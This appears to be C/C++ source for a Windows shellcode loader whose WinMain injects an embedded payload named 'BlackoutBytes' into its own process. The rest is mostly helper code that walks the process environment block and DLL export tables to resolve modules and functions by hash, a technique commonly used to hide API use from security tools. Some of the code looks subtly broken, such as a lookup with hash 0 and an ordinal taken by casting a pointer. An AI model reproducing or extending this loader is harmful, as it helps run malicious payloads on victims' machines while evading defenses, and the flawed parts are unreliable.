#include <Config.h>
#include <Hashing.h>
#include <Shellcode.h>
#include <Macros.h>

INSTANCE Instance = { 0 };

INT WINAPI WinMain(
    HINSTANCE hInstance, 
    HINSTANCE hPrevInstance, 
    LPSTR     lpCmdLine, 
    INT       nShowCmd
) {
    InitInstance();
    
    LocalInjection( BlackoutBytes, BlackoutSize );
}

BOOL InitInstance(
    void
) {
    Instance.Teb = NtCurrentTeb();
}

PVOID LdrLoadModule(
    _In_ ULONG Hash
) {
    PLDR_DATA_TABLE_ENTRY Data  = { 0 };
    PLIST_ENTRY           Head  = { 0 };
    PLIST_ENTRY           Entry = { 0 };

    Head  = &NtCurrentTeb()->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList;
    Entry = Head->Flink;

    if ( !Hash ) {
        Data = (PLDR_DATA_TABLE_ENTRY)( Entry );
        return Data->DllBase;
    }

    for ( ; Head != Entry ; Entry = Entry->Flink ) {
        Data = (PLDR_DATA_TABLE_ENTRY)( Entry );

        if ( HashString( Data->BaseDllName.Buffer, Data->BaseDllName.Length ) == Hash ) {
            return Data->DllBase;
        }
    }

    return NULL;
}

PVOID LdrLoadFunc( 
    _In_ PVOID BaseModule, 
    _In_ ULONG FuncName 
) {
    PIMAGE_NT_HEADERS       pImgNt         = { 0 };
    PIMAGE_EXPORT_DIRECTORY pImgExportDir  = { 0 };
    DWORD                   ExpDirSz       = 0x00;
    PDWORD                  AddrOfFuncs    = NULL;
    PDWORD                  AddrOfNames    = NULL;
    PWORD                   AddrOfOrdinals = NULL;
    PVOID                   FuncAddr       = NULL;

    pImgNt          = (PIMAGE_NT_HEADERS)( B_PTR( BaseModule ) + ((PIMAGE_DOS_HEADER)BaseModule)->e_lfanew );
    pImgExportDir   = (PIMAGE_EXPORT_DIRECTORY)( B_PTR( BaseModule ) + pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );
    ExpDirSz        = U_PTR( B_PTR( BaseModule ) + pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size );

    AddrOfNames     = (PDWORD)( B_PTR( BaseModule ) + pImgExportDir->AddressOfNames );
    AddrOfFuncs     = (PDWORD)( B_PTR( BaseModule ) + pImgExportDir->AddressOfFunctions );
    AddrOfOrdinals  = (PWORD )( B_PTR( BaseModule ) + pImgExportDir->AddressOfNameOrdinals );

    for ( int i = 0 ; i < pImgExportDir->NumberOfNames ; i++ ) {
        PCHAR pFuncName         = (PCHAR)( B_PTR( BaseModule ) + AddrOfNames[i] );
        PVOID pFunctionAddress  = C_PTR( B_PTR( BaseModule ) + AddrOfFuncs[AddrOfOrdinals[i]] );

        if ( HashString( pFuncName, 0 ) == FuncName ) {
            if (( U_PTR( pFunctionAddress ) >= U_PTR( pImgExportDir ) ) &&
                ( U_PTR( pFunctionAddress )  < U_PTR( pImgExportDir ) + ExpDirSz )) {

                CHAR  ForwarderName[MAX_PATH] = { 0 };
                DWORD dwOffset                = 0x00;
                PCHAR FuncMod                 = NULL;
                PCHAR nwFuncName              = NULL;

                bkMemory::Copy<VOID>( ForwarderName, pFunctionAddress, bkString::LengthA( (PCHAR)pFunctionAddress ) );

                for ( int j = 0 ; j < bkString::LengthA( (PCHAR)ForwarderName ) ; j++ ) {
                    if (((PCHAR)ForwarderName)[j] == '.') {
                        dwOffset         = j;
                        ForwarderName[j] = '\0';
                        break;
                    }
                }

                FuncMod    = ForwarderName;
                nwFuncName = ForwarderName + dwOffset + 1;

                fnLoadLibraryA pLoadLibraryA = (fnLoadLibraryA)LdrLoadFunc( LdrLoadModule( H_MODULE_KERNEL32 ), 0 );

                HMODULE hForwardedModule = pLoadLibraryA(FuncMod);
                if ( hForwardedModule ) {
                    if ( nwFuncName[0] == '#' ) {
                        int ordinal = (INT)( nwFuncName + 1 );
                        return (PVOID)LdrLoadFunc( hForwardedModule, HashString( C_PTR( ordinal ), 0 ) );
                    } else {
                        return (PVOID)LdrLoadFunc( hForwardedModule, HashString( nwFuncName, 0 ) );
                    }
                }
                return NULL;
            }

            return C_PTR( pFunctionAddress );
        }
    }

    return NULL;
}
